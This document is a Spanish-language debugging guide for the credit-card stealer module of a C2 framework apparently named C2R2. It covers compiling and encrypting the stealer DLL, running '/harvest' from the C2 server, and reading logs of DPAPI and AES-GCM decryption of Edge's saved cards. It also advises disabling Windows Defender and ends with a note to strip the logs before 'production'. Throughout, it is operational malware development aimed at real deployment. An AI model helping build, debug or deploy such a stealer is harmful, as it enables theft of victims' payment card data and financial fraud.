# 🐛 Testing - Credit Cards Debug

## 📋 Situación actual

El diagnóstico (`find_cards.exe`) confirmó que **hay 1 tarjeta guardada** en `credit_cards`, pero el stealer **no la detecta**.

## 🔍 Versión de debug

Esta versión del stealer incluye **logs detallados** que se muestran **directamente en el servidor** al ejecutar `/harvest`:

- ✅ Qué browsers se intentan robar
- ✅ Si la base de datos Web Data se abre correctamente
- ✅ Si el query SQL se ejecuta
- ✅ Cuántos registros se encuentran
- ✅ **Bytes hexadecimales del dato encriptado**
- ✅ **Formato detectado** (DPAPI raw, v10, v11)
- ✅ Si DPAPI desencripta correctamente
- ✅ **Bytes hexadecimales del dato desencriptado**
- ✅ Si la conversión UTF-8 funciona
- ✅ Si la tarjeta se agrega al resultado

## 🚀 Pasos para testing

### 1. Compilar stealer con logs

**En Linux/Kali:**
```bash
cd /path/to/C2R2

# Compilar DLL con logs de debug
cargo build --release --target x86_64-pc-windows-gnu --package stealer-dll

# Encriptar módulo
cargo run -p builder -- encrypt-module

# Verificar que se generaron:
ls c2r2-server/modules/
# Debería mostrar:
# - stealer.enc
# - stealer.key
```

### 2. Transferir a la VM

Copia desde Linux/Kali a la VM Windows:
- `c2r2-server/modules/stealer.enc`
- `c2r2-server/modules/stealer.key`

### 3. Ejecutar /harvest en la VM

**En la VM Windows:**
```cmd
# 1. Iniciar el servidor C2
cd c2r2-server
.\c2r2-server.exe

# 2. Conectar el agente (desde otra máquina o en la misma VM para testing)
# 3. Ejecutar /harvest

C2R2[1]> /harvest
```

**Los logs de debug aparecerán directamente en la salida del servidor**, al principio del output, en una sección `🔍 DEBUG LOG (Credit Cards)`.

**Ya NO hace falta** revisar archivos en la VM.

## 📝 Interpretación de logs

### ✅ Caso exitoso (tarjeta detectada):

```
=== STEAL_CREDIT_CARDS INICIADO ===
Intentando browser: Edge
  ✅ 1 tarjetas encontradas en Edge
    Extrayendo tarjetas de: Edge
    DB Path: "C:\\Users\\...\\Temp\\webdata_1234.db"
    ✅ DB abierta correctamente
    Ejecutando query...
    ✅ Query preparado correctamente
    Iterando sobre resultados...
    Registro #1
      Nombre: pepito
      Exp: 1/2026
      Encrypted bytes: 50
      Primeros bytes (hex): 01 00 00 00 D0 8C 9D DF 01 15 D1 11 8C 7A 00 C0 4F C2 97 EB
      ℹ️ Formato: DPAPI directo (raw bytes)
      ✅ DPAPI decrypt OK, bytes: 16
      Decrypted bytes (hex): 34 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31
      ✅ UTF8 conversion OK: '4111111111111111'
      ✅ TARJETA AGREGADA!
    Total tarjetas extraídas: 1
```

**📊 Bytes explicados:**
- `Encrypted bytes: 50` = Tamaño típico de DPAPI para 16 dígitos
- `01 00 00 00` = Prefijo DPAPI en Windows
- `Decrypted bytes: 34 31 31 31...` = ASCII "4111111111111111"

### ❌ Caso fallido - Formato v10/v11 (AES-GCM):

```
=== STEAL_CREDIT_CARDS INICIADO ===
Intentando browser: Edge
  ❌ No se encontraron tarjetas en Edge
    Registro #1
      Nombre: pepito
      Exp: 1/2026
      Encrypted bytes: 85
      Primeros bytes (hex): 76 31 30 A7 B2 3C D9 1F 8E 2A 4B 7C 9D 3E 5F ...
      ⚠️ Formato: v10 (AES-256-GCM) - Necesita master key
      ❌ DPAPI decrypt failed - CryptUnprotectData retornó error
      💡 Posibles causas:
         - Windows Defender bloqueando DPAPI
         - Diferente usuario encriptó los datos
         - Tarjeta protegida por Microsoft Account
         - Formato v10/v11 (AES-GCM) requiere master key
```

**📊 Bytes explicados:**
- `76 31 30` = ASCII "v10" = Edge usa AES-256-GCM con master key
- `Encrypted bytes: 85+` = Formato moderno con nonce + ciphertext + tag
- **PROBLEMA**: DPAPI no puede desencriptar esto, necesita master key de Local State

### ❌ Caso fallido - DPAPI bloqueado:

```
Registro #1
  Nombre: pepito
  Exp: 1/2026
  Encrypted bytes: 50
  Primeros bytes (hex): 01 00 00 00 D0 8C 9D DF 01 15 D1 11 8C 7A 00 C0 4F C2 97 EB
  ℹ️ Formato: DPAPI directo (raw bytes)
  ❌ DPAPI decrypt failed - CryptUnprotectData retornó error
  💡 Posibles causas:
     - Windows Defender bloqueando DPAPI
     - Diferente usuario encriptó los datos
     - Tarjeta protegida por Microsoft Account
     - Formato v10/v11 (AES-GCM) requiere master key
```

**📊 Diagnóstico:**
- Formato correcto (DPAPI raw bytes)
- Pero `CryptUnprotectData()` de Windows devuelve error
- **Causa más probable**: Windows security bloqueando la llamada

### ❌ Caso fallido - DB no se puede abrir:

```
=== STEAL_CREDIT_CARDS INICIADO ===
Intentando browser: Edge
  ❌ No se encontraron tarjetas en Edge
    Extrayendo tarjetas de: Edge
    DB Path: "C:\\Users\\...\\Temp\\webdata_1234.db"
    ❌ Error abriendo DB: database is locked  ← PROBLEMA: Archivo bloqueado
```

### ❌ Caso fallido - No hay registros:

```
=== STEAL_CREDIT_CARDS INICIADO ===
Intentando browser: Edge
  ❌ No se encontraron tarjetas en Edge
    Extrayendo tarjetas de: Edge
    DB Path: "C:\\Users\\...\\Temp\\webdata_1234.db"
    ✅ DB abierta correctamente
    Ejecutando query...
    ✅ Query preparado correctamente
    Iterando sobre resultados...
    Total tarjetas extraídas: 0  ← No se encontraron registros
```

## 🔧 Posibles problemas y soluciones

### Problema 1: "❌ DPAPI decrypt failed"

**Causa**: Windows está bloqueando la desencriptación DPAPI (Defender, políticas de seguridad)

**Solución**:
1. Desactivar temporalmente Windows Defender en la VM
2. Verificar que el stealer se ejecute con el mismo usuario que guardó la tarjeta
3. Probar en una VM sin protecciones adicionales

### Problema 2: "❌ Error abriendo DB: database is locked"

**Causa**: Edge tiene la base de datos abierta

**Solución**:
1. Cerrar **completamente** Edge (Task Manager → Matar todos los procesos edge.exe)
2. Ejecutar `/harvest` de nuevo

### Problema 3: "Total tarjetas extraídas: 0" sin errores

**Causa**: La tabla `credit_cards` está vacía en el perfil Default

**Solución**:
1. Ejecutar `find_cards.exe` de nuevo para verificar en qué perfil está la tarjeta
2. El stealer ya busca en Profile 1-5, pero puede estar en un perfil diferente

### Problema 4: Edge guarda tarjetas en la nube

**Causa**: Edge usa Microsoft Account y guarda las tarjetas en la nube, no localmente

**Solución**:
1. `edge://settings/payments`
2. Desactivar "Guardar y rellenar métodos de pago"
3. Eliminar la tarjeta actual
4. Volver a agregar la tarjeta (ahora se guardará localmente)
5. Verificar con `find_cards.exe` que ahora aparezca en `credit_cards`

## 📊 Compartir resultados

Después del testing, comparte:

1. **Screenshot completo** de la salida de `/harvest` (incluyendo la sección `🔍 DEBUG LOG`)
2. **Copia del texto** de la sección DEBUG LOG
3. **Salida** de `find_cards.exe` (para confirmar que la tarjeta sigue ahí)

Con esta información podré identificar exactamente dónde está fallando y crear el fix correcto.

## ⚠️ Recordatorio

**ANTES DE PRODUCCIÓN**: Remover todos los logs de debug del código. Los logs revelan información sensible y ralentizan el stealer.
